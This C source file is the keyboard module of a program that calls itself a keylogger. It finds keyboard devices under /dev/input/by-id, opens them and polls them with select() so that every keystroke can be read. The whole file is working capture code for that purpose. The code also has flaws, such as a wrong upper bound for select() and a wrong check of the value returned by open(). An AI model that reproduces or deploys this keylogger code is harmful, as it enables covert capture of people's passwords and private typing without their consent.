#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <fcntl.h>
#include <error.h>
#include <sys/select.h>
#include "include/keyboard.h"
#include "include/eventReader.h"

/*----------------------------------------*/
// Defines
#define DEV_MAX 256                                 /* # of keyboard devices */
#define KBD_DEV_PATH "/dev/input/by-id"


/*-------------------------------*/


// Variables
extern int g_verbose;                               // program flag in keylogger.c
static char g_kbdPaths[DEV_MAX][PATH_MAX];            /* array to hold keyboard device path strings */
static int g_kbdFDs[DEV_MAX];                         /* array to hold keyboard file descriptors */


/*--------------------------------*/


// Private functions 
int KLG_initKeyboard( int *nKbds );
int KLG_findKeyboards();
int KLG_openKeyboards( int nKbds );

/*----------------------------------------------*/

char *KLG_readKey(){
    static int nKbds = 0;               // # of keyboard devices
    //search for keyboards
    if ( nKbds == 0 ){
        KLG_initKeyboard( &nKbds );
    }
    
    // use select() to poll keyboard file descriptors
    fd_set rfds;                        
    FD_ZERO(&rfds);                     

    // add every device file descriptor to the set
    int i;
    for ( i = 0; i < nKbds; i++ )
    {
        FD_SET( g_kbdFDs[i], &rfds );
        if( g_verbose ){
            printf( "monitoring FD %d : %d\n", g_kbdFDs[i], FD_ISSET( g_kbdFDs[i], &rfds ));
        }
    }
    
    if( g_verbose )
        printf( "listening for key events\n" );
    int nFDs = select( g_kbdFDs[nKbds-1] + 1, &rfds, NULL, NULL, NULL );
    if( g_verbose )
        printf( "event detected\n" );
    // read available file descriptor
    if ( nFDs > 0 ){ 
        // one or more FD is ready after select(). Read from first one.
        for ( i = 0; i < nKbds; i++ ){
            if( FD_ISSET( g_kbdFDs[i], &rfds )){
                return KLG_readKbdDev( g_kbdFDs[i] );
            }
        }
    }else if ( nFDs == 0 ){
        fprintf( stderr, "ERROR : keyboard.c readKey()\n" );
    }else{
        perror( "select()" );
    }
    return NULL;                        // should only be reached if error
}

int KLG_initKeyboard( int *nKbds ){
    if( g_verbose )
        printf( "Looking for keyboards\n" );
    *nKbds = KLG_findKeyboards();
    if( g_verbose )
        printf( "found %d keyboards\n", *nKbds );       
    KLG_openKeyboards( *nKbds );
    return 1;
}


int KLG_findKeyboards(){
    //open keyboard device directory
    DIR *p_dirDevs = opendir( KBD_DEV_PATH );
    if( p_dirDevs == NULL )
        perror( "opening keyboard directory" );
    struct dirent* p_direntry;
    int i = 0;
    while ( i < DEV_MAX  &&  (p_direntry = readdir( p_dirDevs )) ){
        if( g_verbose ){
            printf( "device : %s\n", p_direntry->d_name );
        }
        if ( strstr( p_direntry->d_name, "kbd" )){
            //device file path is equal to KBDDIR + "/" + p_direntry->dname + "\0"
            strcat( strcat( strcat( g_kbdPaths[i++], KBD_DEV_PATH), "/"), p_direntry->d_name);
        }
    }
    return i;
}

int KLG_openKeyboards( int nFiles ){
    //open device files
    int i;
    for ( i = 0; i < nFiles; i++ ){
        g_kbdFDs[i] = open( g_kbdPaths[i], O_RDONLY );
        if( g_verbose )
            printf( "opened FD %d as %s\n", g_kbdFDs[i], g_kbdPaths[i] );
        if( !g_kbdFDs[i] ){
            perror( "keyboard.c openKeyboards()#2" );
            exit( 1 );
        }
    }
    return 1;
}

